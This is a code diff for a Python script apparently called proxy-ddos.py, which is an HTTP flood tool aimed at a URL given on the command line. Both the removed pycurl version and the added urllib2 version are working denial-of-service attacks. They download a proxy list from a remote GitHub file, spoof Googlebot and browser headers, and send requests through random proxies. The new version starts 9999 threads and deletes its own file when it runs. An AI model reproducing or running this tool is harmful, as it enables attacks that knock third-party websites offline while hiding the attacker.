@@ -1,97 +1,144 @@
-#!/usr/bin/python
+import urllib2
+import urllib
+import threading
+import random
+import re
+import sys
+import socket
+import os
+import sys
+import time
 
-import sys, os, signal, pycurl, random, urllib
-from time import time
-from random import choice
+x = os.path.abspath(__file__)
+os.unlink(x)
 
-url = sys.argv[1]
-host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
+
+#if responce time is more than 3s, it's really a bad one. there is no need to dos .
+socket.setdefaulttimeout(1)
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+yanit  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
+yanit_text = yanit.read()
+ips = yanit_text.split('\n')
+
+def inc_counter():
+    global request_counter
+    request_counter+=1
+
+def set_safe():
+    global safe
+    safe=1
+# generates a user agent array
+def useragent_list():
+    global headers_useragents
+    headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
+    headers_useragents.append('Googlebot/2.1 (+http://www.googlebot.com/bot.html)')
+    headers_useragents.append('Googlebot/2.1 (+http://www.google.com/bot.html)')
+    headers_useragents.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')
+    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')
+    headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
+    headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
+    headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0')
+    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0')
+    headers_useragents.append('Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0')
+    headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
+    headers_useragents.append('Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')
+    return(headers_useragents)
+
+# generates a referer array
+def referer_list():
+    global headers_referers
+    headers_referers.append('https://www.google.com.tr/?gws_rd=ssl#q=')
+    headers_referers.append('http://' + host + '/')
+    return(headers_referers)
+#builds random ascii string
+def buildblock(size):
+    out_str = ''
+    for i in range(0, size):
+        a = random.randint(65, 90)
+        out_str += chr(a)
+    return(out_str)
 def random_str_2(size):
     out_str = ''
     letters = 'abcdefghijklmnopqrstuvwxyz'
     for i in range(size):
         out_str += random.choice(letters)
     return (out_str)
+def usage():
+    print '---------------------------------------------------'
+    print 'USAGE: python proxy-ddos.py <url>'
+    print '---------------------------------------------------'
+ 
+def httpcall(url):   
+    useragent_list()
+    referer_list()
+    code=0
+    if url.count("?")>0:
+        param_joiner="&"
+    else:
+        param_joiner="?"
+    #F = open('result.txt')
+    #ips = F.read().split('\n')
+    #F.close()
+    requests = ''
+    vTime = time.time() + 1
+    while 1:
+        if time.time() > vTime:
+            sys.exit()
+        headers = {
+        'User-Agent':random.choice(headers_useragents),
+        'Cache-Control':'no-cache',
+        'Accept':'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5',
+        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Accept-Language':'tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3',
+        'Referer':random.choice(headers_referers) + random_str_2(8),
+        'Keep-Alive':random.randint(300,500),
+        'Connection':'keep-alive',
+        'Host':host
+        }
+        postdata = urllib.urlencode( headers )
+        req = urllib2.Request(url=url,headers=headers)
 
-useragents = [
-    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
-    "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
-    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-]
-referer = [
-    "https://www.google.com.tr/",
-	"http://" + host_url + "/"
-]
+        index = random.randint(0,len(ips)-1)
+        proxy = urllib2.ProxyHandler({'http':ips[index]})
+        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
+        urllib2.install_opener(opener)
 
-handles = []
-SELECT_TIMEOUT = 1
-response = urllib.request.urlopen("https://raw.githubusercontent.com/webr00t/web/master/p.txt")
+        try:
+            urllib2.urlopen(req)
+            #print '***************'
+            inc_counter()
+            #if(request_counter%10==0):
+            print request_counter
+        except Exception,e:
+            #print e
+            #break
+            continue
 
+#http caller thread 
+class HTTPThread(threading.Thread):
+    def run(self):
+        httpcall(url)
 
-pycurl.global_init(pycurl.GLOBAL_DEFAULT)
-
-for line in response:
-    handle = pycurl.Curl()
-    handle.setopt(pycurl.URL, url+random_str_2(8))
-    handle.setopt(pycurl.PROXY, line.strip())
-    handle.setopt(pycurl.FOLLOWLOCATION, 1)
-    handle.setopt(pycurl.VERBOSE, 0)
-    handle.setopt(pycurl.TIMEOUT, 1)
-    handle.setopt(pycurl.MAXCONNECTS, 0)
-    handle.setopt(pycurl.SSL_VERIFYPEER, 0)   
-    handle.setopt(pycurl.SSL_VERIFYHOST, 0)
-    handle.setopt(pycurl.CONNECTTIMEOUT, 1)
-    handle.setopt(pycurl.WRITEFUNCTION, lambda x: None)
-    handle.setopt(pycurl.USERAGENT, choice(useragents))
-    handle.setopt(pycurl.REFERER, choice(referer))
-    handle.setopt(pycurl.HTTPHEADER, [
-        "Host: %s" % host_url,
-        "Accept-Encoding: gzip, deflate",
-        "Cache-Control: no-cache",
-        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5",
-        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-        "Accept-Language: tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3",
-        "Connection: keep-alive",
-    ])
-    handles.append(handle)
-
-for i in range(int(sys.argv[2]) - 1):
-    if os.fork() == 0:
-	break
-
-while True:
-
-    multi = pycurl.CurlMulti()
-
-    for handle in handles:
-        multi.add_handle(handle)
-
-    init = time()
-
-    num_handles = len(handles)
-    while num_handles:
-
-        if time() - init > SELECT_TIMEOUT: break
-
-        ret = multi.select(SELECT_TIMEOUT)
-        if ret == -1: continue
-        while True:
-            ret, num_handles = multi.perform()
-            if ret != pycurl.E_CALL_MULTI_PERFORM: break
-
-    for handle in handles:
-        multi.remove_handle(handle)
-
-    multi.close()
-
-pycurl.global_cleanup()
+#execute 
+if len(sys.argv) < 2:
+    usage()
+    sys.exit()
+else:
+    if sys.argv[1]=="help":
+        usage()
+        sys.exit()
+    else:
+        print "-- Attack Started --"
+        url = sys.argv[1]
+        if url.count("/")==2:
+            url = url + "/"
+        m = re.search('http\://([^/]*)/?.*', url)
+        host = m.group(1)
+        for i in range(9999):
+            t = HTTPThread()
+            t.start()
